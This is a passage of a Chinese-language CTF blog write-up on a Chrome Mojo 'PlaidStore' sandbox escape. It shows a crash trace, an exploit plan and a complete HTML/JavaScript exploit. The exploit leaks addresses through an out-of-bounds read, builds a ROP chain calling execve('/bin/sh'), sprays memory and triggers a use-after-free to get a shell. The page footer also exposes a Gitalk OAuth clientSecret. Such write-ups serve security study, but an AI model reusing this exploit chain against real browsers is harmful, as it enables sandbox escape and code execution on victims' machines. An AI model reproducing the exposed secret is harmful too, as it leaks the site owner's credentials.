namespace)::RunContentMain()</span></span><br><span class="line"><span class="comment">#31 0x559d6e55b19b headless::HeadlessShellMain()</span></span><br><span class="line"><span class="comment">#32 0x559d6bfcdc27 ChromeMain</span></span><br><span class="line"><span class="comment">#33 0x7f62faaf9bbb __libc_start_main</span></span><br><span class="line"><span class="comment">#34 0x559d6bfcda6a _start</span></span><br><span class="line">  r8: 000030791a93d600  r9: 00007ffeb987a3b8 r10: 0000000000000000 r11: 0000000000000000</span><br><span class="line"> r12: 0000000000000028 r13: 0000000000000028 r14: 00007ffeb9879de0 r15: 00007ffeb9879dd0</span><br><span class="line">  di: 000030791a9c5100  si: 00007ffeb9879de0  bp: 00007ffeb9879d60  bx: 000030791aa58ba0</span><br><span class="line">  dx: 0000000000000028  ax: 00000000deadbeef  cx: 00007ffeb9879dd0  sp: 00007ffeb9879d10</span><br><span class="line">  ip: 0000559d6cf2e2d4 efl: 0000000000010202 cgf: 002b000000000033 erf: 0000000000000004</span><br><span class="line"> trp: 000000000000000e msk: 0000000000000000 cr2: 00000000deadc04f</span><br><span class="line">[end of stack trace]</span><br><span class="line">Calling _exit(1). Core file will not be generated.</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="6-exploit">6. exploit</h2>
+<p>综上所述，整体利用流程是这样的：</p>
+<ul>
+<li>
+<p>先创建一个<code>child iframe</code>，利用OOB泄露该<code>child iframe</code>所对应的<code>PlaidStoreImpl::render_frame_host_</code><strong>指针地址</strong>与<code>chromeELF</code><strong>基地址</strong>。最后，将上面两个地址与任意一个<code>PlaidStoreImpl</code>实例地址一并返回给<code>parent iframe</code>。</p>
+<blockquote>
+<p>注意，此时<strong>最好不要马上释放</strong>该<code>child iframe</code>。暂时先保留<code>render_frame_host_</code>的内存区域，直到最后漏洞利用前再释放，以<strong>减小目标内存区域被其他代码所分配的风险</strong>。</p>
+</blockquote>
+</li>
+<li>
+<p>利用<code>child iframe</code>泄露出的ELF基地址，进一步确认各种gadgets的地址。</p>
+</li>
+<li>
+<p>利用JS代码，先精心构造一块特定的gadgets利用数据。</p>
+</li>
+<li>
+<p>将<code>child iframe</code>持有的Mojo管道<code>remote</code>端移交至<code>parent iframe</code>。</p>
+<blockquote>
+<p>先前的UAF Poc中尽管省略了该操作，但poc仍然可以利用成功，因此该操作在利用过程中不是必须的。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>释放</strong><code>child iframe</code>并<strong>多次</strong>执行<code>parent iframe</code>的<code>PlaidStoreImpl::StoreData</code>函数，将<strong>gadgets利用数据</strong>写入内存中。</p>
+</li>
+<li>
+<p>执行<code>child iframe</code>的<code>PlaidStoreImpl::GetData</code>函数</p>
+</li>
+<li>
+<p>成功获取<code>shell</code>！</p>
+</li>
+</ul>
+<p>所以，综合上面的漏洞POC，我们最终的exp如下所示</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 调用MojoJS接口时一定要将这些js包含入html中 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">success</span><span class="params">(msg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + msg);</span></span><br><span class="line">            /*</span><br><span class="line"><span class="javascript">                注意这里最好不要直接修改<span class="built_in">document</span>.body.innerText</span></span><br><span class="line"><span class="javascript">                因为修改<span class="built_in">document</span>.body.innerText将会删除当前body上的所有节点，</span></span><br><span class="line">                包括appendChild上去的child iframe</span><br><span class="line">            */</span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">"#parentLog"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span>(elem == <span class="literal">undefined</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                elem = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.body.appendChild(elem);</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="actionscript">            elem.innerText += <span class="string">'[+] '</span> + msg + <span class="string">'\n'</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">dec2hex</span><span class="params">(dec)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="string">"0x"</span> + dec.toString(<span class="number">16</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">            success(<span class="string">"try append child iframe"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> frame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span></span><br><span class="line">            frame.srcdoc = `</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">dec2hex</span><span class="params">(dec)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="string">"0x"</span> + dec.toString(<span class="number">16</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bytes2DWORD</span><span class="params">(bytes)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> value = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line">            value = value * 0x100 + bytes[7 - i];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> value;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">success</span><span class="params">(msg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + msg);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">"#childLog"</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span>(elem == <span class="literal">undefined</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            elem = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.body.appendChild(elem);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.innerText += <span class="string">'[+] '</span> + msg + <span class="string">'\\n'</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> try_size = <span class="number">100</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> plaidStorePtrList = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> plaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 将plaidStore实例与mojo pipe绑定</span></span></span><br><span class="line">            Mojo.bindInterface(</span><br><span class="line">                blink.mojom.PlaidStore.name,</span><br><span class="line">                mojo.makeRequest(plaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">                <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> plaidStorePtr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x28</span>).fill(<span class="number">0x30</span> + i));</span></span><br><span class="line">            plaidStorePtrList.push(plaidStorePtr);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> PlaidStore_vtable_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> render_frame_host_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意这里使用await，保证异步操作。因为promise回调是同步的。</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 获取返回的promiseValue</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> res = <span class="keyword">await</span> plaidStorePtrList[i].getData(<span class="string">"aaaa"</span>, <span class="number">0x100</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> data = res.data;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x28</span>; j &lt; <span class="number">0x100</span> - <span class="number">0x8</span>; j += <span class="number">0x8</span>) &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 尽管返回的是string，但仍然可以直接当作十六进制数字来使用。</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> hex = bytes2DWORD(data.slice(j, j + <span class="number">0x8</span>));</span></span><br><span class="line">                if ((hex &amp; 0xfff) == 0x7a0) &#123;</span><br><span class="line">                    PlaidStore_vtable_addr = dec2hex(hex);</span><br><span class="line">                    render_frame_host_addr = dec2hex(bytes2DWORD(data.slice(j + 0x8, j + 0x10)));</span><br><span class="line"><span class="actionscript">                    success(<span class="string">"PlaidStore vtable: "</span> + PlaidStore_vtable_addr);</span></span><br><span class="line"><span class="actionscript">                    success(<span class="string">"render_frame_host: "</span> + render_frame_host_addr);</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">break</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (PlaidStore_vtable_addr != 0)</span><br><span class="line"><span class="actionscript">                <span class="keyword">break</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        if (PlaidStore_vtable_addr == 0)</span><br><span class="line"><span class="actionscript">            <span class="keyword">throw</span> <span class="string">"PlaidStore vtable addr leak failed!"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> chromeTextBase = PlaidStore_vtable_addr - <span class="number">0x9fb67a0</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"chrome Text Base: "</span> + dec2hex(chromeTextBase));</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.plaidStorePtr = plaidStorePtrList[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.chromeTextBase = chromeTextBase;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.render_frame_host_addr = render_frame_host_addr;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"iframe loaded"</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span><br><span class="line">`;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.body.appendChild(frame);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 在frame加载完成后再异步执行其中的代码</span></span></span><br><span class="line"><span class="javascript">            frame.contentWindow.addEventListener(<span class="string">"DOMContentLoaded"</span>, <span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"parent iframe start working"</span>)</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 等待frame中的js代码执行完成</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">await</span> frame.contentWindow.pwn();</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> childPlaidStorePtr = frame.contentWindow.plaidStorePtr;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> childRenderFrameHost = <span class="built_in">parseInt</span>(frame.contentWindow.render_frame_host_addr);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> chromeTextBase = <span class="built_in">parseInt</span>(frame.contentWindow.chromeTextBase);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 这里只要判断一个变量就知道iframe是否成功加载</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (childPlaidStorePtr == <span class="literal">undefined</span> || childPlaidStorePtr == <span class="number">0</span>)</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">throw</span> <span class="string">"Error in iframe loading"</span>;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 获取各种gadget地址</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> xchg_addr = chromeTextBase + <span class="number">0x000000000880dee8</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"xchg_addr: "</span> + dec2hex(xchg_addr));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> pop_rdi_ret = chromeTextBase + <span class="number">0x0000000002e4630f</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"pop_rdi_ret: "</span> + dec2hex(pop_rdi_ret));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> pop_rsi_ret = chromeTextBase + <span class="number">0x0000000002d278d2</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"pop_rsi_ret: "</span> + dec2hex(pop_rsi_ret));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> pop_rdx_ret = chromeTextBase + <span class="number">0x0000000002e9998e</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"pop_rdx_ret: "</span> + dec2hex(pop_rdx_ret));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> pop_rax_ret = chromeTextBase + <span class="number">0x0000000002e651dd</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"pop_rax_ret: "</span> + dec2hex(pop_rax_ret));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> syscall_addr = chromeTextBase + <span class="number">0x0000000002ef528d</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"syscall_addr: "</span> + dec2hex(syscall_addr));</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 预先分配0xc28</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xc28</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 将原先buffer转为int64位的数组（内存地址不变</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> uaf_buf = <span class="keyword">new</span> BigUint64Array(buf);</span></span><br><span class="line">                /* 开始布置gadgets</span><br><span class="line">                   先将对应vtable entry的前8个字节设置为childRenderFrameHost+0x10</span><br><span class="line">                   这样当crash时，$rax一定等于该值。 */</span><br><span class="line">                uaf_buf[0] = BigInt(childRenderFrameHost + 0x10);</span><br><span class="line">                uaf_buf[3] = BigInt(pop_rdi_ret);</span><br><span class="line">                uaf_buf[4] = BigInt(childRenderFrameHost + 0x10 + 0x160 + 0x8);</span><br><span class="line">                uaf_buf[5] = BigInt(pop_rsi_ret);</span><br><span class="line">                uaf_buf[6] = BigInt(0);</span><br><span class="line">                uaf_buf[7] = BigInt(pop_rdx_ret);</span><br><span class="line">                uaf_buf[8] = BigInt(0);</span><br><span class="line">                uaf_buf[9] = BigInt(pop_rax_ret);</span><br><span class="line">                uaf_buf[10] = BigInt(59);</span><br><span class="line">                uaf_buf[11] = BigInt(syscall_addr);</span><br><span class="line">                uaf_buf[(0x160 + 0x10) / 0x8] = BigInt(xchg_addr);</span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> uaf_uint8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf); <span class="comment">// /bin/sh\x00</span></span></span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 0] = 0x2f;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 1] = 0x62;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 2] = 0x69;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 3] = 0x6e;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 4] = 0x2f;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 5] = 0x73;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 6] = 0x68;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 7] = 0x00;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">                <span class="comment">// 在parent iframe中建立PlaidStoreImpl实例</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> parentPlaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line">                Mojo.bindInterface(</span><br><span class="line">                    blink.mojom.PlaidStore.name,</span><br><span class="line">                    mojo.makeRequest(parentPlaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">                    <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">                    <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 释放child iframe</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.body.removeChild(frame);</span></span><br><span class="line">                frame.remove();</span><br><span class="line"><span class="actionscript">                <span class="comment">// 大量分配内存，用于占位。</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 需要注意这里的storeData的索引要变化，不然每次填充数据都只会在一块内存区域上反复填充。</span></span></span><br><span class="line"><span class="javascript">                    parentPlaidStorePtr.storeData(<span class="string">"1"</span> + i, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf));</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 尝试利用UAF漏洞来触发</span></span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"get shell!"</span>);</span></span><br><span class="line"><span class="actionscript">                childPlaidStorePtr.getData(<span class="string">"aaaa"</span>, <span class="number">0x28</span>);</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">pwn()</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>执行并利用成功</p>
+<p><img src="/2020/10/mojo/success.png" alt="img"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/10/mojo/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome/" rel="tag">chrome</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sandbox-escape/" rel="tag">sandbox escape</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/10/CVE-2019-5826/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            CVE-2019-5826分析
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/09/uCore-8/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">uCore实验 - Lab8</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
